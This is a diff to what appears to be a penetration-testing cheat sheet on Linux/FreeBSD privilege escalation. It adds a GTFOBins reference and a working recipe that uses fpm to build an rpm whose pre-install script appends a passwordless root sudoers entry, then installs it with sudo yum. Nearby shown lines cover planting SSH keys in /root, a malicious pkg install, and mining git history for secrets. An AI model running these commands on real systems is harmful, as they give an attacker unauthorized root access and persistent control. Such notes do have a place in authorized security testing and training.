@@ -655,6 +655,7 @@ cp --parents .ssh/authorized_keys /root
 
 ### Using fpm to generate a package (pkg exploit)
 https://github.com/jordansissel/fpm
+https://gtfobins.github.io/gtfobins/yum/#sudo
 
 ```
 targets:
@@ -672,9 +673,19 @@ fpm -n x -s dir -t freebsd -a all --before-install ./x.sh /tmp/temporary
 
 running your pkg:
 sudo pkg install -y --no-repo-update ./x-1.0.txz
+
+
+another similar technique:
+
+TF=$(mktemp -d)
+echo 'echo "<username> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > $TF/x.sh
+fpm -n root -s dir -t rpm -a all --before-install $TF/x.sh $TF
+
+sudo yum localinstall -y root-1.0-1.noarch.rpm
 ```
 
 ### Using git to view sensitive data in a localized git repo
 
 1. Use `git log` to view git log history to view the commit ids  
 2. Then you can utilize `git log -p -1` `git log -p -2`... etc to view the content within each commit.  
+
